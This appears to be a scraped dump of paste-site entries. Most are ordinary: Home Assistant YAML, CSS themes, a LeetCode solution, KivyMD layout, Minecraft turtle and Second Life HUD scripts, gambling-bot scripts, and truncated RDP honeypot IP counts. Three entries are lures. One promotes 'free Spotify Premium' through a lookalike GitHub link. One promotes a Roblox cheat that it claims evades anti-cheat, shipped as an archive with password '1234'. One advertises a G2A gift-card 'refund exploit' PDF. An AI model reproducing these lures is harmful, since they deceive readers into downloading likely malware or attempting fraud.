id,title,username,language,date,content
pYhAmQsn,Untitled,anykeyev5,YAML,Tuesday 7th of May 2024 01:04:08 AM CDT,"# Automation
- alias: Offline Zigbee Devices
  id: offline_zigbee_devices
  description: Sends notification for offline Z2m devices
  trigger:
    - platform: time
      at: ""20:00:00""
  condition:
    - condition: template
      value_template: >
        {{states('sensor.z2m_last_seen_entities')|int > 0}}
  action:
    - service: notify.telegram
      data:
        title: Missing Devices
        message: >
          {% set phrase = 's are ' if states('sensor.z2m_last_seen_entities')|int > 1 else ' is ' %} 
          The following sensor{{ phrase }}missing: {{ state_attr('sensor.z2m_last_seen_entities', 'devices') | join(', ') }}
"
CJdrpqRQ,HA Sensor offline entities,anykeyev5,YAML,Tuesday 7th of May 2024 01:02:42 AM CDT,"# sensor
  - trigger:
      - platform: time_pattern
        hours: ""/1""
        minutes: 0
    sensor:
      - unique_id: z2m_last_seen_entities
        name: ""Z2M Last Seen Entities""
        state: >
          {% set lapsed_hours = 36 %}
          {% set ns = namespace(count=0) %}
          {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$')  %}
            {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
              {% set ns.count = ns.count + 1 %}
            {% endif %}
          {% endfor %}
          {{ ns.count }}     
        attributes:
          devices: >
            {% set lapsed_hours = 36 %}
            {% set result = namespace(sensors=[]) %}
            {% for state in states.sensor | selectattr('entity_id', 'search', '.*_last_seen$') %}
              {% if states(state.entity_id) == 'unavailable' or ((as_timestamp(now()) - as_timestamp(states(state.entity_id),0)) > ((lapsed_hours | int) * 60 * 60)) %}
                {% set result.sensors = result.sensors + [state.name | regex_replace(find='_last_seen', replace='') ~ ' (' ~ relative_time(strptime(states(state.entity_id), '%Y-%m-%dT%H:%M:%S%z', 'unavailable')) ~ ')'] %}
              {% endif %}
            {% endfor %}
            {{ result.sensors }}"
ghg4cRGu,FREE SPOTIFY PREMIUM for pc,jordanthebordan,GetText,Tuesday 7th of May 2024 12:59:26 AM CDT,"Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Features of Spotify Premium for PC
Unlimited Music Selection
With over 60 million tracks available, Spotify Premium for PC has a vast collection of songs from various genres, languages, and artists. From the latest releases to old favorites, you can find it all on Spotify. Plus, with personalized recommendations based on your listening history and preferences, you’ll never run out of new music to discover.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Ad-Free Listening
One of the most significant advantages of having a Premium subscription is ad-free listening. Say goodbye to those annoying interruptions and enjoy uninterrupted music streaming for hours on end.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

High-Quality Audio
Spotify Premium offers high-quality audio streaming at 320kbps, which is significantly better than the 160kbps offered in the free version. This means you can listen to your favorite songs with enhanced sound quality and clarity.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Download and Listen Offline
With Spotify Premium, you can download your favorite tracks and listen to them offline. This is perfect for those long flights or road trips where internet connectivity may be limited or non-existent.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Create and Share Playlists
Spotify allows users to create customized playlists with their favorite songs. You can also share your playlists with friends and discover new music through theirs. It’s a great way to expand your music library and connect with others through a shared love of music.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

Access Across Multiple Devices
With one Spotify Premium account, you can access the service on multiple devices, including desktops, laptops, smartphones, tablets, and even gaming consoles. This makes it easy to switch between devices seamlessly without interrupting your listening experience.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

MOD Features
While there are unofficial modified versions of Spotify Premium available, it is not recommended to use them. These MOD versions may offer unlimited features for free and claim to be safer than the official app.

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc

If you do choose to use a MOD version of Spotify Premium, some potential benefits include:
Access to all premium features without paying for a subscription
No ads during music playback
Unlimited skips and track selection

Download - https://github.com/aussieguyrealistics0/SPOTlFY-PREMIUM-for-pc
"
iR9uJdB3,🤑 G2A.com Free Gift Card Guide May 2024 FIX 🤑,jusst2k4,GetText,Tuesday 7th of May 2024 12:11:48 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_835600.pdf

Working as of:
07 May 2024"
2e9WnPMW,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:08:49 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
WefsrgEM,snowybot lua,coinwalk,JavaScript,Tuesday 7th of May 2024 12:03:52 AM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(nextbet*4)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(nextbet*24)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
vwFW4LdT,snowybot lua,coinwalk,JavaScript,Monday 6th of May 2024 11:39:13 PM CDT,"betbse        = (balance/1000)
bethigh       = false
chance        = 49.5
nextbet       = betbse
original      = balance
tens          = (betbse*10)
seventy       = (betbse*70)
twohundreds   = (betbse*50)
sevens        = (betbse*6.9)
eights        = (betbse*7.9)
setasseven    = 0
chickendinner = (balance*24000)
balance       = balance
goodoldbal    = ((math.floor(balance/tens))*tens)
badoldbal     = ((math.floor(balance/tens))*tens)
setsoftens    = 4
resetstats()
 
function dobet()       
if ((balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights)) and (not (balance==setasseven))) then
    nextbet    = previousbet*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(balance/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (((balance-(nextbet*2))<=(original/240)) and (balance<(((math.floor(balance/tens))*tens)+sevens))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*2))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse
    setasseven = 0
end
if (((balance-(nextbet*4))<=(original/240)) and (balance>(((math.floor(balance/tens))*tens)+sevens)) and (balance<(((math.floor(balance/tens))*tens)+eights))) then
    nextbet    = betbse*2
    setasseven = balance
end
if (nextbet==null) then
    nextbet = previousbet
end 
if (balance>=chickendinner) then
print(""winner winner chicken dinner"")
stop()
end
end"
4Ce1Kkpn,Roblox AURORAX Hack,jordanthebordan,GetText,Monday 6th of May 2024 10:32:05 PM CDT,"Note
Roblox AURORA X cheat is designed specifically to give players the ability to fully control the gameplay and enjoy the game without limitations. We offer an extensive set of features that can be activated and customized according to each player's preferences. Just recently we decided to make our cheat free and available to all players without exception. Thanks to our 24/7 support, we fix your problems on time and keep our cheat on top.
 
Features 🛠️:
ESP (Wallhack) - this feature of our cheat will allow you to see behind walls! You will be able to see players' names, their health, exact distance to them, the contents of crates, various lines (such as sight lines), team affiliation and much more!
AIMBOT (Aim Target) - we have implemented the best aimbot (automatic aiming) with lots of customization options. This allows each of your shots to be the last for your opponent. You can choose the target - it can be a specific body part or just precise aiming.
Misc (Tools) - our cheat also has a number of useful tools. For example, there is a function that removes weapon recoil and makes it reload faster. It is also possible to reduce ping, increase FPS by removing unnecessary objects in the scene. There are other useful features.
 
Download - https://github.com/anarxe25bearubear/licx2w
 
Tip
1. Anti-cheats (VAC, FACEIT, ESEA, BATTLEYE, EAC and many others) cannot detect our cheat.
2. Most importantly: the program is completely safe for your Windows system.
3. Support for most systems: Windows 7/8/8.1/10/11 (x32/64)
4. Password Archive - 1234
 
 
Download - https://github.com/anarxe25bearubear/licx2w"
8mLsA2vR,Child Protect,Madi_Perth,Linden Scripting,Monday 6th of May 2024 09:33:32 PM CDT,"#include ""colors.lsl""
#include ""linksetLists.lsl""

// #define DEBUG
#include ""debug.lsl""

// define default dialog buttons
list size_menu = [""Main Menu"", "" --- "", ""Done"", ""Large"", ""Medium"", ""Small""];
list main_Menu = [""Reset"", ""Safezone"", ""Done"", ""Manual"", ""Rating"", ""Size"", ""Help""];
list rate_Menu = [""Main Menu"", "" --- "", ""Done"", ""Adult"", ""Moderate"", ""General""];

// saved safezone data
vector  safe_zone_global;   // coords on grid of safezone
vector  safe_zone_regional; // coords in sim of safezone
key     safe_zone_query;    // dataquery key for safezone
string  safe_zone_name;     // region name of safezone

// default safezone data
key     default_safeQry;
vector  default_safe_global;

key     regionQry;
integer menu_Handle;
integer menu_Channel;

// list config = [""Auto"", ""MATURE"", ""Medium""];

integer hudFlags = 1;

// hud mode flags
#define AUTO  1 // Automatically TP to Safezone;

// hud size flags
integer hud_size;   // size of hud
#define SMALL   1   // small hud size
#define MEDIUM  2   // Medium hud size
#define LARGE   3   // Large hud size

// hud rating 
integer rating_score;
#define GENERAL     1   //general rating
#define MODERATE    2   // moderate rating
#define ADULT       3   // adult raiting

// misc flag variables
integer warningShown = 0;
integer soundPlayed = 0;



// has the avatar teleported to safe zone
integer tp_Flag;
#define TPPED   0x001

string getRatingLevel()
{
    string tm;
    switch (rating_score)
    {
        case ADULT:
        {
            tm = ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm = ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm = ""General."";
            break;
        }
    }
    return tm;
}

// create the text for the hud size dialog
string mk_hudsize()
{
    string ts = ""Select Hud Size.\n\n\tCurrent Hud Size is "";
    switch (hud_size)
    {
        case SMALL:
        {    
            ts += ""Small"";
            break;
        }
        case MEDIUM:
        {    
            ts += ""Medium"";
            break;
        }
        case LARGE:
        {    
            ts += ""Large"";
            break;
        }
    }
    return ts += ""\n"";
}

// create the main menu text
string mk_menu()
{
    string tm = ""Main Menu:\n\n\tTeleport Mode is "";

    if (hudFlags == AUTO)
        tm += ""Auto"";
    else
        tm += ""Manual"";

    tm += ""\n\tSim Rating is "";

    switch (rating_score)
    {
        case ADULT:
        {
            tm += ""Adult."";
            break;
        }
        case MODERATE:
        {
            tm += ""Moderate."";
            break;
        }
        case GENERAL:
        {
            tm += ""General."";
            break;
        }
    }

    tm += ""\n\tCurrent Safe Zone is "";

    if(safe_zone_name != """")
        tm += safe_zone_name;
    else 
        tm += ""WelcomeHub"";

    return tm += ""\n""; 
}


// replace single list entries with 
list replaceListEntry( list entry, string  replace, string with )
{
    integer  index = llListFindList(entry, (list) replace);
    DS(""index = "" + (string) index);
    if(index == -1)
        return entry;
    else
        return llListReplaceList(entry, (list) with, index, index);
}

//Created by Ugleh Ulrik
//This sort of script should cost, but for you free :)
//Edited by Taff Nouvelle to put the buttons in correct order.
list order_buttons(list buttons)
{
    return buttons;
    // return llList2List(buttons, -3, -1) + llList2List(buttons, -6, -4) +
    //     llList2List(buttons, -9, -7) + llList2List(buttons, -12, -10);
}

default
{
    state_entry()
    {

        // cache textures
        llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", 1);
        llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", 1);
        llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", 1);
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", 1);
        llOwnerSay(""Press hud for 2 or more seconds for Main Menu."");

        // set the default size to medium 
        llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
        hud_size = MEDIUM;

        // open channels and set basic texture
        menu_Channel = 0x80000000 | (integer)llFrand(65536) | ((integer)llFrand(65536) << 16);
        menu_Handle = llListen(menu_Channel, """", llGetOwner(), """");
        llSetTexture(""2104d080-0e63-248a-5a90-1fb209c0d25f"", ALL_SIDES);

        // load safezone if saved to linksetdata
        list    tl;
        string  ts;
        if((ts = llLinksetDataRead(""safezone"")) != """")
        {
            // parse saved safezone
            DS(ts);
            tl = llCSV2List(ts);
            safe_zone_global = (vector) llList2String(tl, 0);
            safe_zone_regional = (vector) llList2String(tl, 1);
            safe_zone_name = llList2String(tl, 2);
            DS((string) safe_zone_global);
            DS((string) safe_zone_regional);
            DS((string) safe_zone_name);                        
            
        }
        // else load default safezone
        else 
        {
            // use default WelcomeHub zone
            llOwnerSay(""No saved Safezone found.\nUsing WelcomeHub as default."");
            default_safeQry = llRequestSimulatorData(""WelcomeHub"", DATA_SIM_POS);
        }
        rating_score = 2;   // set default sim score to moderate
        // ask permission then start hud
        llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
    }

    listen( integer channel, string name, key id, string message )
    {
        switch(message)
        {
            case ""Help"":
            {
                llGiveInventory(llGetOwner(), ""Instructions"");
                break;
            }
            // goto safezone
            case ""GO!"":
            {
                vector global;
                vector regional = <128, 128, 20>;

                if(safe_zone_name != """")
                {
                    global = safe_zone_global;
                    regional = safe_zone_regional;
                }
                else 
                {
                    global = default_safe_global;
                }

                warningShown = 1;
                llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                    global, 
                    regional, 
                    ZERO_VECTOR);
                break;

            }
            // set safezone
            case ""Safezone"":
            {
                safe_zone_name = llGetRegionName();
                safe_zone_query = llRequestSimulatorData(safe_zone_name, DATA_SIM_POS);
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // reset the hud
            case ""Reset"":
            {
                llDialog(llGetOwner(), ""Reset Hud? "", [""Yes"", ""No""], menu_Channel);
                break;
            }
            // answer 'Yes'to reset the hud
            case ""Yes"":
            {
                llOwnerSay(""Reseting hud and deleting data."");
                llLinksetDataReset();
                llResetScript();
                break;
            }
            // size of the hud
            case ""Size"":
            {
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case ""Large"":
            {
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.10000, 0.10000>]);
                hud_size = LARGE;
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Medium""):
            {
                hud_size = MEDIUM;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.05000, 0.05000, 0.05000>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            case (""Small""):
            {
                hud_size = SMALL;
                llSetLinkPrimitiveParamsFast(LINK_THIS, [PRIM_SIZE, <0.10000, 0.02500, 0.02500>]);
                llDialog(llGetOwner(), mk_hudsize(), order_buttons(size_menu), menu_Channel);
                break;
            }
            // hud mode of operation
            case ""Auto"":
            {
                hudFlags =  AUTO;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Auto"", ""Manual"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            case ""Manual"":
            {
                hudFlags = 0;
                DS(""hudflags "" + (string) hudFlags );
                main_Menu = replaceListEntry(main_Menu, ""Manual"", ""Auto"");
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // go back to main menu
            case ""Main Menu"":
            {
                llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
                break;
            }
            // ratings dialog
            case ""Rating"":
            {
                // build menu for sim rating dialog
                string ts = ""\n\n\tCurrent setting is "";
                switch (rating_score)
                {
                    case ADULT:
                    {
                        ts += ""Adult."";
                        break;
                    }
                    case MODERATE:
                    {
                        ts += ""Moderate."";
                        break;
                    }
                    case GENERAL:
                    {
                        ts += ""General."";
                        break;
                    }
                }
                ts += ""\n"";

                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                break;
            }
            // case for selecting sim level rating
            case ""Adult"":
            {
                rating_score = ADULT;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""Moderate"":
            {
                rating_score = MODERATE;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
            case ""General"":
            {
                rating_score = GENERAL;
                warningShown = 0;
                string ts = ""\n\n\tCurrent setting is "" + getRatingLevel();
                llDialog(llGetOwner(), ""Set Max Sim Rating"" + ts, rate_Menu, menu_Channel);
                
                break;
            }
        }
        DS(""ratings score "" + (string) rating_score);
    }

    // ask for teleport premission 
    run_time_permissions(integer perm)
    {
        if (PERMISSION_TELEPORT & perm)
        {
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
            llSetTimerEvent(5.0);
        }
        else 
        {
            llOwnerSay(""Hud will not function correctly without teleport premission.\nReattach hud to rest premissions."");
        }
    }

    // check to sim ratings ever 5 seconds
    timer()
    {
        regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
    }

    attach( key id )
    {
        // upon attaching display basic settings 
        string ts = ""Current settings are\n"";

        if(hudFlags == AUTO)
            ts += ""\tTeleport Mode is set to Auto."";
        else 
            ts += ""\tTeleport Mode is set to Manual."";

        ts += ""\n\tCurrent Sim limit is "";
        switch (rating_score)
        {
            case ADULT:
            {
                ts += ""Adult."";
                break;
            }
            case MODERATE:
            {
                ts += ""Moderate."";
                break;
            }
            case GENERAL:
            {
                ts += ""General."";
                break;
            }
        }
        ts += ""\n\tCurrent Safezone is "";

        if(safe_zone_name != """")
            ts += safe_zone_name;
        else 
            ts += ""WelcomeHub"";

        // then request premission to tp
        if(id)
        {
            llOwnerSay(ts);  
            llRequestPermissions(llGetOwner(), PERMISSION_TELEPORT);
        } 
    }

    dataserver( key queryid, string data )
    {
        // getting the curren location when the safezone
        // button is pushed 
        if(safe_zone_query == queryid)
        {
            list tl;

            tl = llGetParcelDetails(llGetPos(), [PARCEL_DETAILS_NAME]);
            safe_zone_global = (vector) data;
            safe_zone_regional = llGetPos();
            llOwnerSay(""Safezone set to "" + safe_zone_name 
                + "", "" + llList2String(tl, 0));
            llLinksetDataWrite(""safezone"", (string) safe_zone_global +"",""+ (string) safe_zone_regional+"",""+safe_zone_name );
            DS(llLinksetDataRead(""safezone""));
        }

        // get location on grid of default safezone
        // currently the G rated WelcomeHub sim
        if(default_safeQry == queryid)
        {
            default_safe_global = (vector) data;
        }

        // set texture depending on sim rating
        // green - PG
        // blue - moderate or mature
        // red - adult (never safe)        
        if(queryid == regionQry)
        {
            integer sim_score;

            switch (data)
            {
                case (""PG""):
                {
                    sim_score = 0;
                    llSetTexture(""119e28e5-1043-0dc0-864e-a403092a4c2a"", ALL_SIDES);
                    break;
                }
                case (""MATURE""):
                {
                    sim_score = 2;
                    llSetTexture(""1fb10f43-10c6-844e-fb94-a78dbc30ed9b"", ALL_SIDES);
                    break;
                }
                default:
                {
                    sim_score = 3;
                    llSetTexture(""723386b5-e554-8430-d464-26d168f3aa58"", ALL_SIDES);
                    break;
                }
            }

            //  monitoring sim rating and tp to savezone
            // if rating exceeds safty score
            if(sim_score > rating_score)
            {

                string ts;

                if(safe_zone_name != """")
                    ts = safe_zone_name;
                else
                    ts = ""WelcomeHub"";

                if(hudFlags == AUTO && warningShown == 0)
                {
                    vector global;
                    vector regional = <128, 128, 20>;

                    DS(safe_zone_name);
                    if(safe_zone_name != """")
                    {
                        global = safe_zone_global;
                        regional = safe_zone_regional;
                    }
                    else 
                    {
                        global = default_safe_global;
                    }
                    DS((string) global);
                    DS((string) regional);
#ifndef DEBUG
                    if(llGetRegionName() != safe_zone_name || llGetRegionName() == ""WelcomeHub"")
                    {
                        llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
                            global, 
                            regional, 
                            ZERO_VECTOR);
                        llDialog(llGetOwner(), 
                            ""Region Rating Surpassed Safty Settings\n\nAvatar Sent to SafeZone at "" + ts +""."", 
                            [""Ok""], menu_Channel);
                    }
#endif
                }
                else if (warningShown == 0) 
                {
                    if(llGetRegionName() != safe_zone_name && llGetRegionName() != ""WelcomeHub"")
                    { 
                        string tb = getRatingLevel();
                        llPlaySound(""d7fa8e1e-2590-bc31-08a2-5d1096231ddf"", 1.0);
                        llDialog(llGetOwner(), 
                            ""WARNING!!!! WARNING!!! WARNING!!!\n\n""+
                            ""Region Rating of "" + llGetRegionName() + "" Surpasses Safty Setting of "" + tb
                            +  ""\n\nPress \""GO!\"" buttong goto safezone at "" + ts +""."", 
                            [""GO!"" ,""Ok""], 
                            menu_Channel);
                        warningShown = 1;
                    }
                }
            }
        }
    
    }

    // hopped to a new region or crossed a regional boundry
    changed( integer change )
    {

        if(CHANGED_REGION & change)
        {
            if(!(llGetPermissions() & PERMISSION_TELEPORT))
                return;
            // region changed
            DS(""region changed"");
            warningShown = 0;
            
            regionQry = llRequestSimulatorData(llGetRegionName(), DATA_SIM_RATING);
        }
        if(CHANGED_OWNER & change)
        {
            llLinksetDataReset();
            llSay(0, ""Ownership Changed, Resetting to Default Settings."");
            llResetScript();
        }
    }


    touch_start( integer num_detected )
    {
        if(llGetPermissions() & PERMISSION_TELEPORT)
            llResetTime();
    }

    // open menu
    touch( integer num_detected )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        if(llGetTime() > 2 && soundPlayed == 0)
        {
            llPlaySound(""d23c9120-ba77-6c69-5ee1-0529b6e6ad5d"", 1);
            soundPlayed = 1;
            llDialog(llGetOwner(), mk_menu(), main_Menu, menu_Channel);
        }
    }

    // panic button pushed taking to safe zone
    touch_end( integer num )
    {
        if(!(llGetPermissions() & PERMISSION_TELEPORT))
            return;
        
        soundPlayed = 0;

        if(llGetTime() < 2)
        {
            vector global;
            vector regional = <128, 128, 20>;
            // panic botton pushed
            llOwnerSay(""Panic Botton Pressed, taking to safe zone."");
            DS(safe_zone_name);
            if(safe_zone_name != """")
            {
                global = safe_zone_global;
                regional = safe_zone_regional;
            }
            else 
            {
                global = default_safe_global;
            }
            DS((string) global);
            DS((string) regional);
#ifndef DEBUG

            llTeleportAgentGlobalCoords(llGetPermissionsKey(), 
            global, 
            regional, 
            ZERO_VECTOR);
           
#endif
        }
    }
}
"
czV1J38B,Everskies CSS *Extras!*,lemontreess,CSS,Monday 6th of May 2024 09:25:48 PM CDT,"/*all attached images are smaller!*/ 
img.attached{
   max-width: 500px !important;
}
/*Bigger text!*/
.ng-star-inserted{
   font-size: 15px;
}
/* images in quotes are even smaller + faded text!*/
blockquote .ng-star-inserted{
   color: #cececea7 !important;
   max-width: 200px !important;
}
/*Changer for all symbol colors*/
I.mdi{
   color: #000000 !important;
}
/* ENTIRE site color editor (allows you to change site theme to other colors than default dark or light!) A little experimental and might not effect everything, lemme know on reddit if it doesn't work in certain places and I'll fix the code!*/
.box-shadow, .rounded, .bg1, .bg0, .list{
   background: #000000 !important;
   border: #000000 !important;
}
/* Gradiant colors for personal theme!*/
.bg5, .b5, div.box-title{
   background-image: linear-gradient(to right, #a663a6, #9bccd5) !important;
   border: #000000 !important;
}
"
LyAFypz8,Dota2 Senate,jayati,C++,Monday 6th of May 2024 08:41:38 PM CDT,"class Solution {
public:
    string predictPartyVictory(string senate) {
        queue<int>dq, rq;
        int n = senate.size();
        for(int i =0 ;i < n;i++)
        {
            if(senate[i] == 'R'){
                rq.push(i);
            }
            else{
                dq.push(i);
            }
        }
        while(!dq.empty() && !rq.empty())
        {
            int ri = rq.front();
            rq.pop();
            int di = dq.front();
            dq.pop();
            if(ri < di)
            {
                rq.push(ri+n);
            }
            else{
                dq.push(di+n);
            }
        }
        if(dq.empty())
        return ""Radiant"";
        else
        return ""Dire"";
    }
};"
tGEQVF83,back ground images animatons,jevixlugya,Python,Monday 6th of May 2024 08:39:12 PM CDT,"<Content>:
    name: 'content'

    MDBoxLayout:
        orientation:'vertical'
        padding:1
        MDTopAppBar:
            title: 'Oluyimba'
            #type_height:'large'
            left_action_items: [['arrow-left', lambda x: root.callback()],['sda2.png', lambda x: None]]
            right_action_items: [['magnify',lambda x:root.searchrecycle(),'search']]
            elevation: 1
            md_bg_color:app.theme_cls.primary_dark
            specific_text_color:1,1,1,1        


           
        ScrollView:
            size:self.size
            id:scroll
            effect_cls: 'ScrollEffect'
            size_hint: 1,1
            bar_width:4
            bar_color:app.theme_cls.primary_color
            MDBoxLayout:
                adaptive_height:True
                orientation:'vertical'
                size_hint_y:None
                height:self.minimum_height
                width:self.minimum_width
                cols:1
                padding:5
                spacing:20
                MDLabel:
                    text:""""
                    id:labelhymn
                    font_size:Factory.Settingsscreen().ids.slid.value
                    #color:app.theme_cls.primary_color
                    adaptive_height:True
                    font_style:'H4'
                    #font_name:'fonts/Roboto-BoldItalic.ttf'
                    bold:True
                   
                MDLabel:
                    text:'                  '    
                MDLabel:
                    text:'                  '

                MDLabel:
                    text: ""...LUGYA.SAMUEL.JEVIX SOFTWARE ...""
                    color: app.theme_cls.primary_dark
                    font_size: 25
                    #font_name:'fonts/Roboto-BlackItalic.ttf'
                    halign:'center'
                    pos_hint:{'center_x':.5,'center_y':.5}
                    bold:True"
0uek2zAA,Everskies CSS,lemontreess,CSS,Monday 6th of May 2024 08:34:18 PM CDT,"/* Basics: background and theme colors!*/

/* Background! Change the link between the ("""") to change the image. If you want the image to fit differently in the background you can change the word ""cover"", to ""contain"" or ""fill""*/
div.background{
   content: url(""https://images.unsplash.com/photo-1562633243-28d2b1556b13?q=80&w=2070&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"");
   object-fit: cover;
}

/* These are for the color of the different buttons! ""Background"" controls the color of the box, ""color"" controls the color of the text, and ""border-color"" is the border color. Change the hexcode (the numbers after the #) to change the color. Right now its just set to black.*/
.bg5, .b5, div.box-title{
   background: #000000 !important; 
   border-color: #000000 !important;
   color: #000000 !important;
}"
WjHNWbZ6,Mining Turtle - Bridge,ToaLetan,Lua,Monday 6th of May 2024 08:10:06 PM CDT,"-- local width, length = 5, 5

local args = {...}

local width = 1
local length = 1
local currentSlot = 1
local paramsMet = false

if (#args == 2) then
    width = tonumber(args[1])
    length = tonumber(args[2])
	paramsMet = true
else
    print('Invalid size, please input width and length as X,Z')
end

if (paramsMet == true) then
	print ('Building bridge with length ' .. length .. '!')

	turtle.select(currentSlot)
	
	for i = 1, length do
		turtle.forward()
		turtle.placeDown()
		turtle.turnLeft()
		turtle.forward()
		turtle.placeDown()
		turtle.turnRight()
		turtle.turnRight()
		turtle.forward()
		turtle.forward()
		turtle.placeDown()
		turtle.turnLeft()
		turtle.turnLeft()
		turtle.forward()
		turtle.turnRight()
	end
end"
A5wERB7w,2024-05-06_stats.json,rdp_snitch,JSON,Monday 6th of May 2024 07:18:17 PM CDT,"{
  ""ip"": {
    ""203.160.55.91"": 123,
    ""194.165.16.11"": 12,
    ""103.232.53.123"": 24,
    ""45.227.254.49"": 6,
    ""193.118.52.78"": 18,
    ""58.218.204.183"": 21,
    ""87.251.75.145"": 12,
    ""123.31.20.85"": 54,
